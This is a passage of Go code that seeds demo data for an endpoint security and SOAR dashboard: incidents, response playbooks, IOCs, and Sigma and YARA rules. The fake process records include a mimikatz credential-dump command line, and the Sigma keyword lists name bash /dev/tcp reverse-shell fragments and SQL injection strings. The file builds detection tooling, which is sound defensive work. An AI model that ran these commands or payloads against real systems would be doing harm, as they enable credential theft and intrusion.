		fingerprint := fmt.Sprintf("demo-%s-%d", a.technique, i)
		var id int
		err := db.QueryRow(`
			INSERT INTO alerts
				(agent_id, severity, rule_name, log_message, created_at,
				 mitre_tactic, mitre_technique, mitre_name, status, fingerprint, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,9999)
			RETURNING id`,
			agentID, a.severity, a.rule, a.message,
			now.Add(-time.Duration(a.minsAgo)*time.Minute),
			a.tactic, a.technique, a.mitreName, a.status, fingerprint,
		).Scan(&id)
		if err != nil {
			log.Printf("alert %d: %v", i, err)
			continue
		}
		ids = append(ids, id)
	}
	return ids
}

func seedIncidents(db *sql.DB, agentIDs []int) []int {
	if len(agentIDs) == 0 {
		return nil
	}
	now := time.Now()
	incidents := []struct {
		agentIdx    int
		title       string
		severity    string
		status      string
		description string
		aiSummary   string
		minsAgo     int
	}{
		{
			0, "Active C2 Beaconing — Suspected Cobalt Strike Implant", "critical", "investigating",
			"Host web-prod-01 generating HTTPS callbacks to 185.220.101.47 every 60s. eBPF telemetry shows beacon process as renamed sshd binary. FIM confirms /usr/sbin/sshd was replaced 4h ago.",
			"High-confidence C2 implant. Recommend immediate isolation of web-prod-01, memory acquisition, and threat hunt across all hosts. Block 185.220.101.47 at firewall immediately.",
			25,
		},
		{
			2, "Credential Dump + Lateral Movement Chain", "high", "investigating",
			"win-workstation-05 ran mimikatz against LSASS, extracted NTLM hashes, then attempted Pass-the-Hash to dc-01 within 8 minutes. AD logs show 3 successful logins with stolen credential.",
			"Multi-stage attack in progress. Disable affected accounts, force Kerberos ticket invalidation, isolate win-workstation-05 for forensic analysis.",
			120,
		},
		{
			1, "Ransomware Contained — 847 Files Encrypted", "critical", "resolved",
			"db-server-02 detected mass .encrypted rename at 847 files/30s. SOAR playbook isolated host and created DFIR snapshot within 90s. Confirmed BlackCat/ALPHV variant.",
			"Contained. Host isolated in 90s. Restoring from clean backup (2026-07-07 02:00 UTC). Patch CVE-2024-1234 on all Linux hosts to close initial access vector.",
			480,
		},
	}

	var ids []int
	for _, inc := range incidents {
		agentID := agentIDs[inc.agentIdx%len(agentIDs)]
		var id int
		err := db.QueryRow(`
			INSERT INTO incidents
				(agent_id, title, severity, status, description, ai_summary, created_at, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,9999)
			RETURNING id`,
			agentID, inc.title, inc.severity, inc.status, inc.description, inc.aiSummary,
			now.Add(-time.Duration(inc.minsAgo)*time.Minute),
		).Scan(&id)
		if err != nil {
			log.Printf("incident: %v", err)
			continue
		}
		ids = append(ids, id)
	}
	return ids
}

type pbStep struct {
	stepOrder  int
	actionType string
	payload    string
	condition  string
	stepName   string
}

type prebuiltPB struct {
	name        string
	triggerType string
	actionType  string
	steps       []pbStep
}

func seedPlaybooks(db *sql.DB, agentIDs []int, incidentIDs []int) []int {
	prebuilt := []prebuiltPB{
		// ── 1 ──────────────────────────────────────────────────────────────────
		{
			name: "Ransomware: Full Containment Response", triggerType: "alert_critical", actionType: "isolate_host",
			steps: []pbStep{
				{1, "isolate_host", `{}`, ``, "isolate"},
				{2, "collect_processes", `{}`, ``, "snapshot_procs"},
				{3, "collect_file_hashes", `{}`, ``, "snapshot_hashes"},
				{4, "pagerduty_incident", `{"severity":"critical","component":"endpoint","summary":"Ransomware containment initiated"}`, ``, "page_oncall"},
			},
		},
		// ── 2 ──────────────────────────────────────────────────────────────────
		{
			name: "C2 Beacon: Block and Collect", triggerType: "alert_high", actionType: "collect_connections",
			steps: []pbStep{
				{1, "collect_connections", `{}`, ``, "collect_net"},
				{2, "collect_processes", `{}`, ``, "collect_procs"},
				{3, "webhook", `{"url":"{{SIEM_WEBHOOK}}","method":"POST","body":{"event":"c2_beacon","agent":"{{alert.agent_id}}"}}`, ``, "alert_siem"},
				{4, "slack_message", `{"channel":"#soc-alerts","text":"C2 beacon detected on {{alert.hostname}} — connections collected, review dashboard."}`, ``, "notify_slack"},
			},
		},
		// ── 3 ──────────────────────────────────────────────────────────────────
		{
			name: "YARA Malware Match: Quarantine and DFIR", triggerType: "YARA Match", actionType: "quarantine_file",
			steps: []pbStep{
				{1, "quarantine_file", `{"path":"{{alert.file_path}}"}`, ``, "quarantine"},
				{2, "collect_file_hashes", `{}`, ``, "hash_scan"},
				{3, "collect_processes", `{}`, ``, "proc_snap"},
				{4, "pagerduty_incident", `{"severity":"high","component":"malware","summary":"YARA match quarantine — {{alert.rule_name}}"}`, ``, "page_soc"},
			},
		},
		// ── 4 ──────────────────────────────────────────────────────────────────
		{
			name: "Brute Force: Block and Alert", triggerType: "alert_high", actionType: "webhook",
			steps: []pbStep{
				{1, "webhook", `{"url":"{{FIREWALL_API}}","method":"POST","body":{"action":"block","ip":"{{alert.src_ip}}"}}`, ``, "block_ip"},
				{2, "slack_message", `{"channel":"#soc-alerts","text":"Brute-force source {{alert.src_ip}} blocked via firewall."}`, ``, "notify"},
				{3, "collect_auth_logs", `{}`, ``, "collect_auth"},
			},
		},
		// ── 5 ──────────────────────────────────────────────────────────────────
		{
			name: "Data Exfiltration: Isolate and Notify", triggerType: "alert_critical", actionType: "isolate_host",
			steps: []pbStep{
				{1, "collect_connections", `{}`, ``, "capture_net"},
				{2, "isolate_host", `{}`, ``, "isolate"},
				{3, "email_alert", `{"to":"ciso@company.com","subject":"Exfiltration alert — host isolated","body":"Agent {{alert.hostname}} isolated after exfiltration detection. Review DFIR snapshot."}`, ``, "email_ciso"},
				{4, "pagerduty_incident", `{"severity":"critical","component":"data-loss","summary":"Potential exfiltration — host isolated"}`, ``, "page_oncall"},
			},
		},
		// ── 6 ──────────────────────────────────────────────────────────────────
		{
			name: "IOC Match: Enrich and Block", triggerType: "IOC Match", actionType: "webhook",
			steps: []pbStep{
				{1, "collect_connections", `{}`, ``, "capture"},
				{2, "webhook", `{"url":"{{FIREWALL_API}}","method":"POST","body":{"action":"block","ip":"{{alert.ioc_value}}"}}`, ``, "block"},
				{3, "slack_message", `{"channel":"#threat-intel","text":"IOC match on {{alert.hostname}}: {{alert.ioc_value}} blocked."}`, ``, "notify"},
			},
		},
		// ── 7 ──────────────────────────────────────────────────────────────────
		{
			name: "Privilege Escalation: Collect and Page", triggerType: "alert_high", actionType: "collect_processes",
			steps: []pbStep{
				{1, "collect_processes", `{}`, ``, "proc_snap"},
				{2, "collect_users", `{}`, ``, "user_snap"},
				{3, "collect_auth_logs", `{}`, ``, "auth_snap"},
				{4, "pagerduty_incident", `{"severity":"high","component":"identity","summary":"Privilege escalation detected — {{alert.hostname}}"}`, ``, "page"},
			},
		},
		// ── 8 ──────────────────────────────────────────────────────────────────
		{
			name: "Lateral Movement: Isolate Source Host", triggerType: "alert_critical", actionType: "isolate_host",
			steps: []pbStep{
				{1, "collect_connections", `{}`, ``, "net_snap"},
				{2, "collect_processes", `{}`, ``, "proc_snap"},
				{3, "isolate_host", `{}`, `severity == "critical"`, "isolate"},
				{4, "slack_message", `{"channel":"#soc-critical","text":"Lateral movement on {{alert.hostname}} — host isolated. Connections captured."}`, ``, "notify"},
			},
		},
		// ── 9 ──────────────────────────────────────────────────────────────────
		{
			name: "Port Scan: Firewall Block and Log", triggerType: "alert_medium", actionType: "webhook",
			steps: []pbStep{
				{1, "collect_connections", `{}`, ``, "capture_net"},
				{2, "webhook", `{"url":"{{FIREWALL_API}}","method":"POST","body":{"action":"rate_limit","ip":"{{alert.src_ip}}"}}`, ``, "rate_limit"},
				{3, "slack_message", `{"channel":"#soc-alerts","text":"Port scan from {{alert.src_ip}} — rate-limited at firewall."}`, ``, "notify"},
			},
		},
		// ── 10 ─────────────────────────────────────────────────────────────────
		{
			name: "Insider Threat: Snapshot and Escalate", triggerType: "alert_high", actionType: "collect_processes",
			steps: []pbStep{
				{1, "collect_processes", `{}`, ``, "proc_snap"},
				{2, "collect_connections", `{}`, ``, "net_snap"},
				{3, "collect_auth_logs", `{}`, ``, "auth_snap"},
				{4, "email_alert", `{"to":"hr-security@company.com","subject":"Insider threat alert","body":"User activity on {{alert.hostname}} flagged. Evidence collected. Review case."}`, ``, "email_hr"},
			},
		},
		// ── 11 ─────────────────────────────────────────────────────────────────
		{
			name: "Phishing Response: Quarantine and Notify", triggerType: "alert_medium", actionType: "quarantine_file",
			steps: []pbStep{
				{1, "quarantine_file", `{"path":"{{alert.file_path}}"}`, ``, "quarantine"},
				{2, "email_alert", `{"to":"security@company.com","subject":"Phishing attachment quarantined","body":"File quarantined on {{alert.hostname}}. User notified."}`, ``, "notify_user"},
				{3, "slack_message", `{"channel":"#soc-alerts","text":"Phishing file quarantined on {{alert.hostname}} — rule: {{alert.rule_name}}"}`, ``, "notify_soc"},
			},
		},
		// ── 12 ─────────────────────────────────────────────────────────────────
		{
			name: "Supply Chain: Full Audit Snapshot", triggerType: "alert_critical", actionType: "collect_packages",
			steps: []pbStep{
				{1, "collect_packages", `{}`, ``, "pkg_snap"},
				{2, "collect_file_hashes", `{}`, ``, "hash_snap"},
				{3, "collect_processes", `{}`, ``, "proc_snap"},
				{4, "pagerduty_incident", `{"severity":"critical","component":"supply-chain","summary":"Supply chain compromise suspected on {{alert.hostname}}"}`, ``, "page"},
			},
		},
		// ── 13 ─────────────────────────────────────────────────────────────────
		{
			name: "Critical Incident: Auto-DFIR Collection", triggerType: "incident_created", actionType: "collect_processes",
			steps: []pbStep{
				{1, "collect_processes", `{}`, ``, "proc_snap"},
				{2, "collect_connections", `{}`, ``, "net_snap"},
				{3, "collect_file_hashes", `{}`, ``, "hash_snap"},
				{4, "collect_auth_logs", `{}`, ``, "auth_snap"},
				{5, "slack_message", `{"channel":"#soc-incidents","text":"Auto-DFIR snapshot collected for new incident #{{incident.id}} on {{alert.hostname}}."}`, ``, "notify"},
			},
		},
		// ── 14 ─────────────────────────────────────────────────────────────────
		{
			name: "Zero-Day Exploit: Emergency Isolation", triggerType: "alert_critical", actionType: "isolate_host",
			steps: []pbStep{
				{1, "isolate_host", `{}`, ``, "isolate"},
				{2, "collect_processes", `{}`, ``, "proc_snap"},
				{3, "collect_connections", `{}`, ``, "net_snap"},
				{4, "collect_file_hashes", `{}`, ``, "hash_snap"},
				{5, "pagerduty_incident", `{"severity":"critical","component":"zero-day","summary":"Zero-day exploit suspected — {{alert.hostname}} isolated for emergency DFIR"}`, ``, "page_ciso"},
				{6, "email_alert", `{"to":"ciso@company.com","subject":"[CRITICAL] Zero-day response initiated","body":"Host {{alert.hostname}} isolated. DFIR snapshot underway. Playbook executed automatically."}`, ``, "email_ciso"},
			},
		},
	}

	var pbIDs []int
	for _, p := range prebuilt {
		var id int
		err := db.QueryRow(`
			INSERT INTO playbooks (name, trigger_type, action_type, enabled, tenant_id)
			VALUES ($1,$2,$3,true,9999)
			RETURNING id`,
			p.name, p.triggerType, p.actionType,
		).Scan(&id)
		if err != nil {
			log.Printf("playbook insert: %v", err)
			continue
		}
		pbIDs = append(pbIDs, id)

		// Seed multi-step actions for this playbook
		for _, s := range p.steps {
			payload := s.payload
			if payload == "" {
				payload = "{}"
			}
			_, aerr := db.Exec(`
				INSERT INTO playbook_actions
					(playbook_id, step_order, action_type, payload, condition_expr,
					 max_retries, retry_delay_secs, timeout_seconds, run_parallel,
					 step_name, tenant_id)
				VALUES ($1,$2,$3,$4::jsonb,$5,0,5,60,false,$6,9999)`,
				id, s.stepOrder, s.actionType, payload, s.condition, s.stepName,
			)
			if aerr != nil {
				log.Printf("playbook action (pb %d step %d): %v", id, s.stepOrder, aerr)
			}
		}
	}

	// Seed pending-approval executions so SOAR queue has visible items
	if len(pbIDs) >= 3 && len(agentIDs) >= 2 {
		mustExec(db, `
			INSERT INTO playbook_executions
				(playbook_id, agent_id, action_type, status, created_at, tenant_id)
			VALUES ($1,$2,'isolate_host','pending_approval',$3,9999)`,
			pbIDs[0], agentIDs[0], time.Now().Add(-10*time.Minute),
		)
		mustExec(db, `
			INSERT INTO playbook_executions
				(playbook_id, agent_id, action_type, status, created_at, tenant_id)
			VALUES ($1,$2,'quarantine_file','pending_approval',$3,9999)`,
			pbIDs[2], agentIDs[1], time.Now().Add(-5*time.Minute),
		)
		mustExec(db, `
			INSERT INTO playbook_executions
				(playbook_id, agent_id, action_type, status, created_at, tenant_id)
			VALUES ($1,$2,'isolate_host','pending_approval',$3,9999)`,
			pbIDs[7], agentIDs[0], time.Now().Add(-2*time.Minute),
		)
	}
	return pbIDs
}

func seedFIM(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	type change struct {
		agentIdx   int
		path       string
		changeType string
		oldHash    string
		newHash    string
		minsAgo    int
	}
	changes := []change{
		{0, "/etc/passwd", "modified", "a1b2c3d4e5f6", "f6e5d4c3b2a1", 45},
		{0, "/usr/sbin/sshd", "modified", "deadbeef1234", "cafebabe5678", 240},
		{0, "/etc/crontab", "modified", "11223344aabb", "aabb11223344", 102},
		{1, "/etc/sudoers", "modified", "99887766ffee", "ffeeff998877", 180},
		{1, "/var/spool/cron/root", "created", "", "123abc456def", 102},
		{2, "C:\\Windows\\System32\\cmd.exe", "modified", "abcdef123456", "654321fedcba", 320},
		{2, "C:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\helper.bat", "created", "", "aabbccdd1122", 200},
	}
	for _, ch := range changes {
		agentID := agentIDs[ch.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO fim_alerts
				(agent_id, file_path, change_type, old_hash, new_hash, created_at, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,9999)`,
			agentID, ch.path, ch.changeType, ch.oldHash, ch.newHash,
			now.Add(-time.Duration(ch.minsAgo)*time.Minute),
		)
	}
}

func seedCompliance(db *sql.DB) {
	// compliance_scores requires a parent compliance_reports row
	var reportID int
	err := db.QueryRow(`
		INSERT INTO compliance_reports
			(title, report_type, generated_by, summary, created_at, tenant_id)
		VALUES ('Demo Environment Baseline','automated','demo-seeder','{}',now(),9999)
		RETURNING id`,
	).Scan(&reportID)
	if err != nil {
		log.Printf("compliance_reports: %v", err)
		return
	}

	frameworks := []struct {
		framework string
		score     int
		passed    int
		failed    int
	}{
		{"CIS", 72, 144, 56},
		{"NIST_CSF", 68, 68, 32},
		{"PCI_DSS", 81, 97, 23},
	}
	for _, f := range frameworks {
		mustExec(db, `
			INSERT INTO compliance_scores
				(report_id, framework, score, passed, failed, computed_at, tenant_id)
			VALUES ($1,$2,$3,$4,$5,now(),9999)`,
			reportID, f.framework, f.score, f.passed, f.failed,
		)
	}
}

func seedProcesses(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	type proc struct {
		agentIdx int
		pid      int
		name     string
		cmdline  string
		user     string
		cpu      string
		mem      string
	}
	procs := []proc{
		{0, 1, "systemd", "/sbin/init", "root", "0.1", "0.3"},
		{0, 1234, "nginx", "nginx: master process /usr/sbin/nginx", "www-data", "0.3", "1.2"},
		{0, 5820, "sshd", "/usr/sbin/sshd -D", "root", "99.2", "0.2"},
		{0, 6001, "python3", "python3 /tmp/.hidden/c2client.py", "root", "1.2", "0.6"},
		{1, 1, "systemd", "/sbin/init", "root", "0.1", "0.3"},
		{1, 3310, "mysqld", "/usr/sbin/mysqld --daemonize", "mysql", "4.5", "18.2"},
		{1, 4521, "bash", "bash /tmp/.hidden/beacon", "www-data", "0.8", "0.1"},
		{2, 4, "System", "", "SYSTEM", "0.2", "0.1"},
		{2, 584, "lsass.exe", "C:\\Windows\\System32\\lsass.exe", "SYSTEM", "0.5", "0.8"},
		{2, 8832, "mimikatz.exe", "mimikatz.exe privilege::debug sekurlsa::logonpasswords", "Administrator", "45.3", "0.3"},
		{2, 9100, "powershell.exe", "powershell.exe -EncodedCommand SQBFAFgA...", "User", "2.1", "1.2"},
	}
	for _, p := range procs {
		agentID := agentIDs[p.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO endpoint_processes
				(agent_id, pid, process_name, cmdline, username, cpu_percent, mem_percent, collected_at, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,9999)`,
			agentID, p.pid, p.name, p.cmdline, p.user, p.cpu, p.mem, now,
		)
	}
}

func seedIOCs(db *sql.DB) {
	iocs := []struct {
		indicator, iocType, severity, desc, source string
	}{
		{"185.220.101.47", "ip", "critical", "Known Cobalt Strike C2 IP — Tor exit relay used in multiple campaigns", "mandiant"},
		{"94.102.49.190", "ip", "high", "Exfiltration staging server — associated with APT28", "misp"},
		{"45.33.32.156", "ip", "high", "SSH brute force source — scanners.io botnet node", "abuseipdb"},
		{"evil-domain.xyz", "domain", "high", "DNS tunneling C2 domain — iodine profile match", "internal"},
		{"203.0.113.42", "ip", "medium", "TLS 1.0 downgrade proxy — outdated cipher negotiation observed", "internal"},
		{"d41d8cd98f00b204e9800998ecf8427e", "md5", "critical", "Empty file hash used as YARA evasion marker", "virustotal"},
		{"44d88612fea8a8f36de82e1278abb02f", "md5", "high", "Mimikatz binary hash — sekurlsa module variant", "virustotal"},
		{"275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f", "sha256", "critical", "BlackCat/ALPHV ransomware encryptor — July 2026 campaign", "cisa"},
		{"com.hacker.spyware", "package", "high", "Android spyware package — data exfiltration capabilities", "internal"},
		{"rootkit_helper.ko", "filename", "critical", "Unsigned kernel module — rootkit loader", "internal"},
		{"/tmp/.hidden/beacon", "path", "high", "Beacon binary path — C2 dropper staging location", "internal"},
		{"beacon.cobaltrike.net", "domain", "critical", "Cobalt Strike team server domain", "threatfox"},
		{"SQBFAFgA", "string", "medium", "PowerShell base64 encoded payload prefix", "internal"},
	}
	for _, ioc := range iocs {
		mustExec(db, `
			INSERT INTO iocs (indicator, type, severity, description, source, enabled, tenant_id)
			VALUES ($1,$2,$3,$4,$5,true,9999)
			ON CONFLICT DO NOTHING`,
			ioc.indicator, ioc.iocType, ioc.severity, ioc.desc, ioc.source,
		)
	}
}

func seedThreatFeeds(db *sql.DB) {
	feeds := []struct {
		name, source, feedType, format string
		iocCount                        int
	}{
		{"Emerging Threats", "https://rules.emergingthreats.net/blockrules/compromised-ips.txt", "flatfile", "plaintext", 48231},
		{"CISA KEV", "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json", "flatfile", "json", 1112},
		{"ThreatFox IOCs", "https://threatfox-api.abuse.ch/api/v1/", "api", "json", 82450},
		{"AbuseIPDB", "https://api.abuseipdb.com/api/v2/blacklist", "api", "json", 15820},
		{"MISP Community Feed", "https://www.circl.lu/doc/misp/feed-osint/", "taxii", "json", 34102},
	}
	for _, f := range feeds {
		mustExec(db, `
			INSERT INTO threat_feeds (name, source, feed_type, format, enabled, ioc_count, last_sync, tenant_id)
			VALUES ($1,$2,$3,$4,true,$5,now()-interval '2 hours',9999)
			ON CONFLICT DO NOTHING`,
			f.name, f.source, f.feedType, f.format, f.iocCount,
		)
	}
}

func seedThreatActors(db *sql.DB) {
	actors := []struct {
		name, country, motivation, sophistication, desc string
		aliases, sectors, techniques                    []string
	}{
		{
			"APT28", "Russia", "espionage", "nation-state",
			"Russian GRU-affiliated threat actor known for targeting government, military, and media organizations worldwide.",
			[]string{"Fancy Bear", "Sofacy", "STRONTIUM"},
			[]string{"government", "military", "media", "aerospace"},
			[]string{"T1071.001", "T1059.001", "T1078", "T1027"},
		},
		{
			"Lazarus Group", "North Korea", "financial", "nation-state",
			"North Korean APT responsible for cryptocurrency theft and ransomware campaigns. Linked to WannaCry.",
			[]string{"Hidden Cobra", "ZINC", "Whois Team"},
			[]string{"financial", "cryptocurrency", "defense"},
			[]string{"T1486", "T1059.003", "T1566.001", "T1105"},
		},
		{
			"BlackCat / ALPHV", "Unknown", "financial", "high",
			"Ransomware-as-a-service (RaaS) group using Rust-based encryptor. Targets critical infrastructure.",
			[]string{"ALPHV", "Noberus"},
			[]string{"healthcare", "critical_infrastructure", "manufacturing"},
			[]string{"T1486", "T1490", "T1082", "T1083"},
		},
	}
	for _, a := range actors {
		aliases := fmt.Sprintf(`{"%s"}`, joinStr(a.aliases, `","`))
		sectors := fmt.Sprintf(`{"%s"}`, joinStr(a.sectors, `","`))
		techniques := fmt.Sprintf(`{"%s"}`, joinStr(a.techniques, `","`))
		mustExec(db, `
			INSERT INTO threat_actors
				(name, aliases, origin_country, motivation, sophistication, description, targeted_sectors, mitre_techniques, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,9999)
			ON CONFLICT DO NOTHING`,
			a.name, aliases, a.country, a.motivation, a.sophistication, a.desc, sectors, techniques,
		)
	}
}

func joinStr(s []string, sep string) string {
	result := ""
	for i, v := range s {
		if i > 0 {
			result += sep
		}
		result += v
	}
	return result
}

func seedSigmaRules(db *sql.DB) {
	rules := []struct {
		title, severity, tactic, technique, mitreN, logsrc, desc string
		keywords                                                  []string
	}{
		{"Mimikatz LSASS Dump", "critical", "Credential Access", "T1003.001", "OS Credential Dumping: LSASS Memory", "process", "Detects mimikatz credential dump via LSASS access", []string{"mimikatz", "sekurlsa", "lsass"}},
		{"PowerShell Base64 Encoded Command", "high", "Execution", "T1059.001", "PowerShell", "process", "Detects PowerShell running base64 encoded payloads", []string{"-EncodedCommand", "-enc", "powershell"}},
		{"Cobalt Strike Beacon Pattern", "critical", "Command and Control", "T1071.001", "Application Layer Protocol: Web Protocols", "network", "Detects Cobalt Strike malleable C2 beacon patterns", []string{"jitter", "x64/meterpreter", "msf"}},
		{"Scheduled Task Persistence", "medium", "Persistence", "T1053.005", "Scheduled Task/Job: Scheduled Task", "process", "Detects suspicious scheduled task creation for persistence", []string{"schtasks", "/create", "/sc", "startup"}},
		{"Windows Defender Disable via Registry", "high", "Defense Evasion", "T1562.001", "Disable or Modify Tools", "registry", "Detects disabling of Windows Defender via registry modification", []string{"DisableRealtimeMonitoring", "Windows Defender"}},
		{"Ransomware File Extension Rename", "critical", "Impact", "T1486", "Data Encrypted for Impact", "file", "Detects mass file renaming with encrypted extensions", []string{".encrypted", ".locked", ".crypted", ".enc"}},
		{"DNS Tunneling via Long TXT Queries", "high", "Command and Control", "T1071.004", "Application Layer Protocol: DNS", "dns", "Detects DNS tunneling using unusually long TXT record queries", []string{"TXT", "evil-domain", "iodine"}},
		{"Pass-the-Hash NTLM Authentication", "high", "Lateral Movement", "T1550.002", "Use Alternate Authentication Material: Pass the Hash", "network", "Detects NTLM pass-the-hash lateral movement", []string{"NTLM", "NTHash", "hash reuse"}},
		{"Suspicious Cron Job Creation", "medium", "Persistence", "T1053.003", "Scheduled Task/Job: Cron", "process", "Detects cron job creation in suspicious directories", []string{"/tmp/", ".hidden", "crontab", "*/5"}},
		{"SUID Binary Modification", "high", "Privilege Escalation", "T1548.001", "Abuse Elevation Control: Setuid/Setgid", "file", "Detects SUID bit being set on non-standard binaries", []string{"chmod +s", "chmod 4755", "setuid"}},
		{"Event Log Cleared", "high", "Defense Evasion", "T1070.001", "Indicator Removal: Clear Windows Event Logs", "event", "Detects clearing of Windows Security event logs", []string{"Event ID 1102", "Security log cleared", "EvtClearLog"}},
		{"Reverse Shell via Bash", "critical", "Execution", "T1059.004", "Unix Shell", "process", "Detects reverse shell using bash /dev/tcp technique", []string{"bash -i", "/dev/tcp", ">&", "0>&1"}},
		{"Android USB Debugging Enabled", "medium", "Defense Evasion", "T1562", "Impair Defenses", "android", "Detects USB debugging mode enabled on Android devices", []string{"adb", "USB debugging", "developer mode"}},
		{"Kernel Module Load — Unsigned", "critical", "Persistence", "T1547.006", "Kernel Modules and Extensions", "kernel", "Detects loading of unsigned or suspicious kernel modules", []string{"insmod", "modprobe", ".ko", "rootkit"}},
		{"SQL Injection in HTTP POST", "high", "Initial Access", "T1190", "Exploit Public-Facing Application", "web", "Detects SQL injection patterns in HTTP POST body", []string{"' OR '1'='1", "UNION SELECT", "--", "xp_cmdshell"}},
		{"Office Macro Execution via Word", "high", "Execution", "T1204.002", "User Execution: Malicious File", "process", "Detects cmd.exe or PowerShell spawned by Word macros", []string{"winword.exe", "cmd.exe", "powershell.exe", "macro"}},
		{"Impossible Travel Login", "medium", "Initial Access", "T1078", "Valid Accounts", "auth", "Detects login from geographically impossible location", []string{"impossible travel", "geo anomaly", "location change"}},
		{"JA3 Fingerprint Malware Match", "high", "Command and Control", "T1071", "Application Layer Protocol", "network", "Detects TLS connections matching known malware JA3 fingerprints", []string{"JA3", "Metasploit", "CobaltStrike", "769,47-53"}},
		{"Suspicious Data Exfiltration Volume", "high", "Exfiltration", "T1048", "Exfiltration Over Alternative Protocol", "network", "Detects large data transfers to external IPs", []string{"15 MB", "exfil", "HTTPS upload", "large transfer"}},
		{"Android Rooting Tool Detected", "high", "Defense Evasion", "T1562", "Impair Defenses", "android", "Detects Magisk or SuperSU presence indicating device rooting", []string{"Magisk", "SuperSU", "/dev/.magisk", "root"}},
	}
	for _, r := range rules {
		kwJSON := `["` + joinStr(r.keywords, `","`) + `"]`
		mustExec(db, `
			INSERT INTO sigma_rules
				(title, severity, mitre_tactic, mitre_technique, mitre_name, logsource_cat, description, keywords, enabled, status, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8::jsonb,true,'stable',9999)
			ON CONFLICT DO NOTHING`,
			r.title, r.severity, r.tactic, r.technique, r.mitreN, r.logsrc, r.desc, kwJSON,
		)
	}
}

func seedYaraRules(db *sql.DB, agentIDs []int) {
	rules := []struct {
		name, desc, content string
	}{
		{
			"Cobalt_Strike_Beacon",
			"Detects Cobalt Strike beacon binary patterns",
			`rule Cobalt_Strike_Beacon {
  meta:
    description = "Detects Cobalt Strike beacon"
    author = "XCloak Threat Intel"
    severity = "critical"
  strings:
    $cs1 = "MZ" nocase
    $cs2 = { 4D 5A 90 00 03 00 00 00 }
    $jitter = "sleep_mask" nocase
    $pipe = "\\\\.\\pipe\\msagent_" wide
  condition:
    $cs1 at 0 and ($jitter or $pipe)
}`,
		},
		{
			"Mimikatz_Generic",
			"Detects Mimikatz credential dump tool variants",
			`rule Mimikatz_Generic {
  meta:
    description = "Detects Mimikatz variants"
    severity = "critical"
  strings:
    $s1 = "sekurlsa" nocase
    $s2 = "lsadump" nocase
    $s3 = "mimikatz" nocase
    $s4 = "privilege::debug" nocase
  condition:
    2 of them
}`,
		},
		{
			"BlackCat_Ransomware",
			"Detects BlackCat/ALPHV ransomware encryptor",
			`rule BlackCat_Ransomware {
  meta:
    description = "Detects BlackCat/ALPHV ransomware"
    severity = "critical"
  strings:
    $enc1 = ".encrypted" wide
    $note = "RECOVER-" wide
    $rust = "ALPHV_BLACKCAT" nocase
  condition:
    2 of them
}`,
		},
	}
	var ruleIDs []int
	for _, r := range rules {
		var id int
		err := db.QueryRow(`
			INSERT INTO yara_rules (name, description, rule_content, enabled, tenant_id)
			VALUES ($1,$2,$3,true,9999)
			ON CONFLICT DO NOTHING
			RETURNING id`,
			r.name, r.desc, r.content,
		).Scan(&id)
		if err == nil {
			ruleIDs = append(ruleIDs, id)
		}
	}

	if len(ruleIDs) == 0 || len(agentIDs) == 0 {
		return
	}
	matches := []struct {
		agentIdx  int
		ruleIdx   int
		path      string
		hash      string
		minsAgo   int
	}{
		{0, 0, "/tmp/.hidden/beacon", "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f", 240},
		{2, 1, "C:\\Windows\\Temp\\mimikatz.exe", "44d88612fea8a8f36de82e1278abb02f", 43},
		{1, 2, "/var/data/.enc_agent", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", 480},
	}
	for _, m := range matches {
		agentID := agentIDs[m.agentIdx%len(agentIDs)]
		ruleName := rules[m.ruleIdx%len(rules)].name
		mustExec(db, `
			INSERT INTO yara_matches
				(agent_id, file_path, rule_name, severity, description, file_hash, matched_strings, tenant_id)
			VALUES ($1,$2,$3,'critical','YARA rule matched malware signature',$4,'["$s1","$s2"]',9999)`,
			agentID, m.path, ruleName, m.hash,
		)
	}
}

func seedFirewallRules(db *sql.DB) {
	rules := []struct {
		name, src, dst, proto, action, desc, group string
		port, priority                              int
	}{
		{"Block Cobalt Strike C2", "0.0.0.0/0", "185.220.101.47", "tcp", "drop", "Auto-blocked C2 IP from IOC feed", "IOC Blocks", 443, 1},
		{"Block Known Exfil Server", "10.0.0.0/8", "94.102.49.190", "tcp", "drop", "Outbound exfiltration staging server", "IOC Blocks", 443, 2},
		{"Block Brute Force Source", "0.0.0.0/0", "45.33.32.156", "tcp", "drop", "SSH brute force — 42 failed attempts", "Threat Blocks", 22, 3},
		{"Allow Web Traffic", "10.0.0.0/8", "0.0.0.0/0", "tcp", "accept", "Permit internal web traffic", "Base Policy", 80, 100},
		{"Allow HTTPS", "10.0.0.0/8", "0.0.0.0/0", "tcp", "accept", "Permit internal HTTPS traffic", "Base Policy", 443, 101},
		{"Allow DNS Internal", "10.0.0.0/8", "10.0.1.1", "udp", "accept", "Internal DNS resolution only", "Base Policy", 53, 102},
		{"Block Telnet", "0.0.0.0/0", "0.0.0.0/0", "tcp", "drop", "Telnet is prohibited — use SSH", "Hardening", 23, 10},
		{"Block RDP from Internet", "0.0.0.0/0", "10.0.0.0/8", "tcp", "drop", "No direct RDP from external networks", "Hardening", 3389, 11},
		{"Allow SSH from Bastion", "10.0.1.5", "10.0.0.0/8", "tcp", "accept", "SSH access only from bastion host", "Base Policy", 22, 50},
		{"Log All Outbound Denied", "10.0.0.0/8", "0.0.0.0/0", "any", "log", "Log all denied outbound connections", "Audit", 0, 999},
	}
	for _, r := range rules {
		mustExec(db, `
			INSERT INTO firewall_rules
				(name, source_ip, destination_ip, protocol, port, action, enabled, priority, description, group_name, hit_count, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,true,$7,$8,$9,$10,9999)
